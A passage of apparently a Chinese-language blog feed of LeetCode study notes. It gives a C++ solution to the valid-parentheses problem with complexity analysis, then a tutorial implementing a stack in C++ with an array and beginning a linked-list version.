class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isValid</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">    stack&lt;<span class="type">char</span>&gt; sk;</span><br><span class="line">    <span class="keyword">if</span>(s == <span class="string">&quot;&quot;</span>) &#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;;</span><br><span class="line">    <span class="comment">// iterate over the string</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">char</span> c: s)&#123;</span><br><span class="line">        <span class="keyword">if</span>(c == <span class="string">&#x27;(&#x27;</span> || c == <span class="string">&#x27;[&#x27;</span> || c == <span class="string">&#x27;&#123;&#x27;</span>)&#123;</span><br><span class="line">            sk.<span class="built_in">push</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                <span class="keyword">if</span> ( sk.<span class="built_in">top</span>()==<span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">                    sk.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;]&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                <span class="keyword">if</span> ( sk.<span class="built_in">top</span>()==<span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">                    sk.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;&#125;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                <span class="keyword">if</span> ( sk.<span class="built_in">top</span>()==<span class="string">&#x27;&#123;&#x27;</span>)&#123;</span><br><span class="line">                    sk.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string str=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Is it valid?: &quot;</span> &lt;&lt; <span class="built_in">isValid</span>(str) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li>遍歷字串：程式碼遍歷整個輸入字串 s，這是一個線性操作，時間複雜度為 $O(N)$，其中 $N$ 是字串的長度</li><li>堆疊操作：在遍歷過程中，對堆疊進行的操作（push 和 pop）均是常數時間操作，時間複雜度為 $O(1)$<br>綜合來看，整體時間複雜度為：$O(N)$</li></ul><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>程式碼中使用了一個堆疊來儲存左括號，堆疊的空間複雜度取決於未匹配的左括號數量，最壞狀況就是所有的括號都會被壓入棧中</p><p>這樣的話，空間複雜度將是 $O(N)$，$N$為括號數量，其餘變數都是常數別操作，因此整體空間複雜度會是 $O(N)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷題必會知識 | 堆疊 (Stack) | LeetCode 筆記</title>
      <link href="/posts/a27c9492.html"/>
      <url>/posts/a27c9492.html</url>
      
        <content type="html"><![CDATA[<h1 id="甚麼是-Stack"><a href="#甚麼是-Stack" class="headerlink" title="甚麼是 Stack?"></a>甚麼是 Stack?</h1><p>Stack 是一種資料結構，具有 <strong>後進先出(Last-In-First-Out, LIFO)</strong> 的特性，</p><p><img src="/img/LeetCode/stack/stack.png"></p><h1 id="Stack-實作-C"><a href="#Stack-實作-C" class="headerlink" title="Stack 實作 (C++)"></a>Stack 實作 (C++)</h1><p>這裡我想透過 C++ 去時做一個完整的 Stack 功能，並且實踐常見的 <code>push</code>, <code>pop</code>, <code>isEmpty</code> 等等操作</p><h2 id="用-Array-實作-Stack"><a href="#用-Array-實作-Stack" class="headerlink" title="用 Array 實作 Stack"></a>用 Array 實作 Stack</h2><p>再透過C++ 實作Stack得時候，需要注意某些變數不能被外部存取，像是</p><ul><li><code>top</code>: 用於指向stack 的頂端，也就是最上面的index</li><li><code>capacity</code>: stack的記憶體大小</li><li><code>*stack</code>:  指向stack的指標</li></ul><p>因此與上面相關的變數需要作為 Private 的成員變數。另外再使用陣列實踐Stack的時候有時候會出現，記憶體不夠的狀況，因此可以透過建立一個自動擴展capacity的函數來解決。</p><p>另外，在實作Pop的時候，<strong>並不需要將資料實際移除，而是將 <code>top</code> 扣掉1，好像是我們真的把資料從stack刪除一樣，但實際上並沒有，而是在未來Push的時候再將現有資料蓋過去即可，這樣的做法可以節省記憶體操作成本</strong></p><p><img src="/img/LeetCode/stack/pop.png"></p><blockquote><p>注意: 在進行Pop或者是 Top操作(回傳現在Stack最頂端資料值)前都需要先判斷 Stack是否為空，<code>st.empty()</code></p></blockquote><h3 id="完整程式碼"><a href="#完整程式碼" class="headerlink" title="完整程式碼"></a>完整程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StackArray</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> top; <span class="comment">//Index of top element of Stack</span></span><br><span class="line">        <span class="type">int</span> capacity; <span class="comment">// Allocated memory</span></span><br><span class="line">        <span class="type">int</span> *stack;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">DoubleCapacity</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// Define constructor with initial state: top=-1, capacity=1</span></span><br><span class="line">        <span class="built_in">StackArray</span>():<span class="built_in">top</span>(<span class="number">-1</span>),<span class="built_in">capacity</span>(<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">//Init a int array with capacity=1</span></span><br><span class="line">            stack = <span class="keyword">new</span> <span class="type">int</span>[capacity];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(<span class="type">int</span> x)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span>  <span class="title">Top</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span>  <span class="title">getSize</span><span class="params">()</span></span>;  </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackArray::DoubleCapacity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Double capacity</span></span><br><span class="line">    capacity = capacity *<span class="number">2</span>;</span><br><span class="line">    <span class="comment">// Reallocate memory</span></span><br><span class="line">    <span class="type">int</span> *new_stack = <span class="keyword">new</span> <span class="type">int</span>[capacity];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//copy elements to new stack</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; capacity/<span class="number">2</span>;i++)&#123;</span><br><span class="line">        new_stack[i] = stack[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free memory, this is used to free memory that allocated by new[]</span></span><br><span class="line">    <span class="keyword">delete</span>[] stack;  </span><br><span class="line">    <span class="comment">// redrect new_stack to stack</span></span><br><span class="line">    stack = new_stack;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackArray::Push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (top == capacity<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">DoubleCapacity</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    stack[++top] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackArray::Pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Empty Stack, nothing to pop!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//update top</span></span><br><span class="line">    top--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">StackArray::isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(top == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return top element of stack</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackArray::Top</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Empty Stack, nothing on the top!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stack[top];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackArray::getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> top+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    StackArray sk;</span><br><span class="line">    sk.<span class="built_in">Pop</span>();</span><br><span class="line">    sk.<span class="built_in">Push</span>(<span class="number">14</span>);</span><br><span class="line">    sk.<span class="built_in">Push</span>(<span class="number">9</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\n top: &quot;</span> &lt;&lt; sk.<span class="built_in">Top</span>() &lt;&lt; <span class="string">&quot;\nsize: &quot;</span> &lt;&lt; sk.<span class="built_in">getSize</span>() &lt;&lt; endl;</span><br><span class="line">    sk.<span class="built_in">Push</span>(<span class="number">7</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\n top: &quot;</span> &lt;&lt; sk.<span class="built_in">Top</span>() &lt;&lt; <span class="string">&quot;\nsize: &quot;</span> &lt;&lt; sk.<span class="built_in">getSize</span>() &lt;&lt; endl;</span><br><span class="line">    sk.<span class="built_in">Pop</span>();</span><br><span class="line">    sk.<span class="built_in">Pop</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\n top: &quot;</span> &lt;&lt; sk.<span class="built_in">Top</span>() &lt;&lt; <span class="string">&quot;\nsize: &quot;</span> &lt;&lt; sk.<span class="built_in">getSize</span>() &lt;&lt; endl;</span><br><span class="line">    sk.<span class="built_in">Pop</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\n top: &quot;</span> &lt;&lt; sk.<span class="built_in">Top</span>() &lt;&lt; <span class="string">&quot;\nsize: &quot;</span> &lt;&lt; sk.<span class="built_in">getSize</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>執行結果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Empty Stack, nothing to pop!</span><br><span class="line">top: 9</span><br><span class="line">size: 2</span><br><span class="line"></span><br><span class="line">top: 7</span><br><span class="line">size: 3</span><br><span class="line"></span><br><span class="line">top: 14</span><br><span class="line">size: 1</span><br><span class="line">Empty Stack, nothing on the top!</span><br><span class="line"></span><br><span class="line">top: -1</span><br><span class="line">size: 0</span><br></pre></td></tr></table></figure><h3 id="程式碼說明"><a href="#程式碼說明" class="headerlink" title="程式碼說明"></a>程式碼說明</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StackArray</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> top; <span class="comment">//Index of top element of Stack</span></span><br><span class="line">        <span class="type">int</span> capacity; <span class="comment">// Allocated memory</span></span><br><span class="line">        <span class="type">int</span> *stack;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">DoubleCapacity</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// Define constructor with initial state: top=-1, capacity=1</span></span><br><span class="line">        <span class="built_in">StackArray</span>():<span class="built_in">top</span>(<span class="number">-1</span>),<span class="built_in">capacity</span>(<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">//Init a int array with capacity=1</span></span><br><span class="line">            stack = <span class="keyword">new</span> <span class="type">int</span>[capacity];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(<span class="type">int</span> x)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span>  <span class="title">Top</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span>  <span class="title">getSize</span><span class="params">()</span></span>;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我們透過建立一個 StackArray Class 來去定義Stack 本身以及相應的操作，其中在初始化方面，我們透過constructor <code>StackArray</code> (建構子會與class名稱一樣) 來去初始化 private成員變數 <code>top=-1</code>, <code>capacity=1</code>，並且宣告一個新的記憶體空間，是一個大小為 <code>capacity</code> 的整數陣列，並且透過指標 <code>stack*</code> 指向該陣列。</p><p>接著再 Public 區域就宣告了我們之後會對Stack 進行的各種操作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackArray::DoubleCapacity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Double capacity</span></span><br><span class="line">    capacity = capacity *<span class="number">2</span>;</span><br><span class="line">    <span class="comment">// Reallocate memory</span></span><br><span class="line">    <span class="type">int</span> *new_stack = <span class="keyword">new</span> <span class="type">int</span>[capacity];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//copy elements to new stack</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; capacity/<span class="number">2</span>;i++)&#123;</span><br><span class="line">        new_stack[i] = stack[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// free memory, this is used to free memory that allocated by new[]</span></span><br><span class="line">    <span class="keyword">delete</span>[] stack;  </span><br><span class="line">    <span class="comment">// redrect new_stack to stack</span></span><br><span class="line">    stack = new_stack;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>DoubleCapacity</code> 這個函數主要會去將 <code>capacity</code> 乘上2，然後定義具有雙倍capacity的新stack，再將舊stack的資料都複製到新的，接著把舊stack的陣列記憶體空間釋放，並且更新指標。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackArray::Push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (top == capacity<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">DoubleCapacity</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    stack[++top] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackArray::Pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Empty Stack, nothing to pop!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//update top</span></span><br><span class="line">    top--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Push的部分首先，**要先確定 Stack 滿了沒?**，確認方式就是檢查 <code>top</code> 的值是否跟 <code>capacity-1</code>一樣(因為是陣列，所以要扣1)，如果一樣，就代表滿了，需要更多空間，就直接呼叫剛才定義過的 <code>DoubleCapacity</code> 函數。接著就是push資料進Stack，這裡為了減少行數，將 <code>++top</code> 以及 <code>stack[top] =x</code> 合併乘同一行。</p><p>Pop的部分就需要先檢查Stack是否為空，因此需要先呼叫 <code>isEmpty()</code> 函數來確認是否是空，如果是空的就跳訊息並回到 main function，如果非空，那就直接將top值減少1</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">StackArray::isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(top == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return top element of stack</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackArray::Top</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Empty Stack, nothing on the top!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stack[top];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackArray::getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> top+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>isEmpty()</code> 的部分，就去比較top是否為初始值，如果是那就是空的，如果不是就不空。</li><li><code>Top()</code> 的部分，一樣會需要先檢查stack 是否為空，如果空的就回到main func，如果非空就回傳stack最top的內容值</li><li><code>getSize()</code>: 就直接回傳top+1 (因為陣列index運算的關係，一開始宣成-1，所以要加回來)</li></ul><h2 id="用-Linked-List-實作-Stack"><a href="#用-Linked-List-實作-Stack" class="headerlink" title="用 Linked List 實作 Stack"></a>用 Linked List 實作 Stack</h2><p><img src="/img/LeetCode/stack/linked_list.png"></p><p>如果用 Linked List來實作Stack，在Linkest List 中的 <code>first</code> 或 <code>head</code>，也就是鏈結的首端元素會是Stack的頂部，所以你要push到Stack，等同於是使用 Linked List中的 <code>push_front()</code> 函數。</p><p>下面的程式碼主要是透過兩個 class 來實作，分別是 <code>StackNode</code> 以及 <code>StackList</code>，<code>StackNode</code> 用來定義Linked List的節點，而 <code>StackList</code> 用來定應首端節點，也就是 <code>*top</code>。</p><blockquote><p><strong>用 Struct 和 Class 定義節點的差異在哪?</strong></p><blockquote><p>用 Struct 定義的成員變數一定是 public，誰都可以存取，但用class，可以將stack入口的 <code>top</code> 放入private，就可以限制對節點的存取，main()就無法變更每個節點的資料，這可能會是安全性上的考量</p></blockquote></blockquote><h3 id="完整程式碼-1"><a href="#完整程式碼-1" class="headerlink" title="完整程式碼"></a>完整程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span 